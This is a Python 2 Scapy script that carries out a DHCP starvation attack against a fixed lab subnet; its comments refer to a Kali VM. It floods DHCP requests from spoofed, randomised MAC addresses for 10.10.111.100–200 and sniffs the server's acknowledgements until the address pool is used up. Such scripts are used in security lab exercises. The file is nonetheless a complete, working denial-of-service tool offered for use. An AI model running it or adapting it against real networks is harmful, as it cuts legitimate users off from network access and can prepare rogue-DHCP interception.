
from scapy.all import *
from time import sleep 
from threading import Thread

"""
This function will store spoofed MAC addresses and IPaddresses 
from 10.10.111.100 to 10.10.111.200
Excluding 10.10.111.102 (which is the IP address for Kali VM Running the dhcp starvation script)
"""

class DHCP_Store(object):
    def __init__(self):
        self.mac = []
        self.ip = []

# Function to maintain the ACK and NAK for the requested IPs'

    def Req_handling(self,pkt):
    	if pkt[DHCP]:
        
            if pkt[DHCP].options[0][1]==5:    # 5 represents acknowledgement
            	
            	
            	self.ip.append(pkt[IP].dst)   
            	print str(pkt[IP].dst)+" registered"
            	print "Acknowledgement Packet Sent."
        	          
            elif pkt[DHCP].options[0][1]==6:  # 6 represents negative acknowledgement 
            	print "Negative Acknowledgement Packet Sent."
            
# Function for niffing UDP Traffic 
    def sniffing_packet(self):
        sniff(filter="udp and (port 67 or port 68)",prn=self.Req_handling,store=0)

# Function to start the process..    
    def process_Start(self):
    	thread = Thread(target=self.sniffing_packet)
    	thread.start()
    	print "Starvation Started..."
    	while len(self.ip) < 100:
        	self.dhcp_starve()
    
    	print "All requested IPs are Starved"

# Function to Starve the IPs     
    def dhcp_starve(self):
    	src_mac = RandMAC()
        for i in range(0,101):
            if i == 2: 
                continue
            req_ip_addr = "10.10.111."+str(100+i)
            
            if req_ip_addr in self.ip:		#If Ips are already registered
                continue
            # Store mac addresses in a list to prevent duplicate mac addresses
            spoof_mac = ""
            while spoof_mac in self.mac:
                spoof_mac = RandMAC()
            self.mac.append(spoof_mac)

            
            hw=spoof_mac
            pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")/ IP(src="0.0.0.0", dst="255.255.255.255")/ UDP(sport=68, dport=67)/BOOTP(chaddr=hw)/DHCP(options=[("message-type", "request"),("requested_addr", req_ip_addr),("server_id", "10.10.111.1"),"end"])
            
            sendp(pkt)		
            print "Trying.... "+req_ip_addr
            sleep(2.0) 


starvation = DHCP_Store()
starvation.process_Start()
